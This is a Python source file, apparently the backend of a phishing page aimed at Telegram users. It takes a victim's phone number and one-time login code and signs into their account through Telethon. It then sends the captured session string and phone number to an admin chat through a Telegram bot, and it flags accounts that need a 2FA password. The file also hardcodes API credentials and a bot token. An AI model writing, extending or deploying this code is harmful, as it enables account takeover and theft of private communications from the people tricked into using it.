import asyncio, os, logging
from aiogram import Bot, Dispatcher
from aiohttp import web
import aiohttp_cors
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

# Конфигурация
API_ID, API_HASH = 15587172, "d3d35aebb0b6ebdb7a002836914ee37d"
BOT_TOKEN, ADMIN_ID = "8613728108:AAGR9Lmdx2YvG6wbg8qk31rcLxeKD4Vu6Po", 1866813859

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
active_clients = {}

async def handle_api(request):
    try:
        data = await request.json()
        uid, act = str(data.get("user_id")), data.get("action")
        
        if act == "send_phone":
            phone = data.get("phone").replace(" ", "").replace("-", "")
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            sent = await client.send_code_request(phone)
            active_clients[uid] = {"c": client, "p": phone, "h": sent.phone_code_hash}
            return web.json_response({"status": "ok"})
            
        elif act == "send_code":
            s = active_clients.get(uid)
            if not s: return web.json_response({"status": "error", "message": "Сессия истекла"})
            try:
                await s["c"].sign_in(s["p"], data.get("code"), phone_code_hash=s["h"])
                ss = s["c"].session.save()
                await bot.send_message(ADMIN_ID, f"✅ ВХОД!\n{s['p']}\n\n`{ss}`", parse_mode="Markdown")
                return web.json_response({"status": "success"})
            except SessionPasswordNeededError:
                return web.json_response({"status": "need_2fa"})
                
    except Exception as e:
        return web.json_response({"status": "error", "message": str(e)})

app = web.Application()
# Настройка CORS
cors = aiohttp_cors.setup(app, defaults={
    "*": aiohttp_cors.ResourceOptions(
        allow_credentials=True,
        expose_headers="*",
        allow_headers="*",
    )
})

# РЕГИСТРИРУЕМ ТОЛЬКО ОДИН РАЗ
resource = app.router.add_resource("/api")
route = resource.add_route("POST", handle_api)
cors.add(route)

async def main():
    port = int(os.environ.get("PORT", 10000))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logging.info(f"Сервер запущен на порту {port}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
